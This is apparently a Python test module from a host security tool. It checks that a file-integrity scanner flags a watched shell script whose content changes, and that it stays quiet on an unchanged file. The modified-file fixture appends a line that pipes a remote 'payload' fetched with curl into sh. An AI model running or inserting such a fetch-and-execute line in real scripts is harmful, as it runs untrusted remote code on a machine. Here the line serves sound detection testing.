"""
secure/validate/scenarios/fileintegrity.py — "suspicious file changes"
from the instruction's own behavior list.

Injection boundary: fileintegrity watch paths are DB-driven
(`add_watch_path`), not config-file-driven — the real
`scan_file_integrity()` is called against a real (sandbox) temp
directory added as a watch path, no monkeypatching needed at all. Full
fidelity: real lstat(), real SHA-256 hashing, real code path, on files
that only ever exist under the sandbox's own temp directory.
"""

from __future__ import annotations

import os

from secure.explain.dispatch import explain
from secure.fileintegrity.paths import normalize_path
from secure.fileintegrity.scanner import scan_file_integrity
from secure.storage.models import add_watch_path
from secure.validate import CATEGORY_FILE_CHANGE, OUTCOME_MISS, OUTCOME_PASS
from secure.validate.attck import T1036_005
from secure.validate.rubric import score_explanation
from secure.validate.sandbox import Sandbox
from secure.validate.scenario import ScenarioResult, timed


def scenario_content_modified_detected(sb: Sandbox) -> ScenarioResult:
    def build():
        watched = sb.cfg.app_dir_path() / "validate_fixtures" / "watched"
        watched.mkdir(parents=True, exist_ok=True)
        target = watched / "helper.sh"
        target.write_text("#!/bin/sh\necho normal\n")
        os.chmod(target, 0o755)  # executable — a content change here is MEDIUM, not LOW,
        # and MEDIUM/HIGH is what actually gets persisted to file_integrity_alerts (see
        # fileintegrity/scanner.py's own module docstring) — a non-executable's routine
        # content edit is deliberately LOW/in-memory-only, so using one here would silently
        # never produce a real, checkable alert row despite scan_file_integrity()'s own
        # in-process return value still listing it.

        add_watch_path(sb.conn, normalize_path(str(watched)), sensitivity="normal")
        scan_file_integrity(sb.conn)  # baseline pass — establishes the known-good hash

        target.write_text("#!/bin/sh\necho normal\ncurl -s http://198.51.100.7/payload | sh\n")
        os.chmod(target, 0o755)
        result = scan_file_integrity(sb.conn)

        modified = [a for a in result.alerts if a.kind == "modified"]
        explanation = explain(modified[0], "file_integrity_alerts") if modified else None
        checklist = score_explanation(explanation)

        return ScenarioResult(
            scenario_id="fileintegrity_content_modified_detected",
            technique_id=T1036_005.technique_id,
            technique_name=T1036_005.name,
            category=CATEGORY_FILE_CHANGE,
            description="A watched file's content changes between two scans.",
            expected_result="A 'modified' file-integrity alert fires on the second scan.",
            sensors_observed=["fileintegrity"] if modified else [],
            findings=[{"table": "file_integrity_alerts", "id": a.id, "severity": a.severity, "kind": a.kind} for a in modified],
            correlation_result=None,
            explanation_checklist=checklist,
            dedup_result=None,
            latency_ms=None,
            outcome=OUTCOME_PASS if modified else OUTCOME_MISS,
            notes="" if modified else "Expected 'modified' alert did not fire.",
            started_at="",
            completed_at="",
        )

    return timed("fileintegrity_content_modified_detected", build)


def scenario_unchanged_file_no_alert(sb: Sandbox) -> ScenarioResult:
    def build():
        watched = sb.cfg.app_dir_path() / "validate_fixtures" / "watched_stable"
        watched.mkdir(parents=True, exist_ok=True)
        (watched / "steady.txt").write_text("nothing to see here\n")

        add_watch_path(sb.conn, normalize_path(str(watched)), sensitivity="normal")
        scan_file_integrity(sb.conn)
        result = scan_file_integrity(sb.conn)  # second pass, nothing changed

        no_false_alert = len(result.alerts) == 0

        return ScenarioResult(
            scenario_id="fileintegrity_unchanged_file_no_alert",
            technique_id=T1036_005.technique_id,
            technique_name=T1036_005.name,
            category=CATEGORY_FILE_CHANGE,
            description="A watched file that genuinely never changes across two scans — a false-positive check.",
            expected_result="No alert on the second (unchanged) scan.",
            sensors_observed=["fileintegrity"],
            findings=[],
            correlation_result=None,
            explanation_checklist={},
            dedup_result=None,
            latency_ms=None,
            outcome=OUTCOME_PASS if no_false_alert else OUTCOME_MISS,
            notes="" if no_false_alert else f"{len(result.alerts)} unexpected alert(s) fired on an unchanged file.",
            started_at="",
            completed_at="",
        )

    return timed("fileintegrity_unchanged_file_no_alert", build)


SCENARIOS = [
    scenario_content_modified_detected,
    scenario_unchanged_file_no_alert,
]
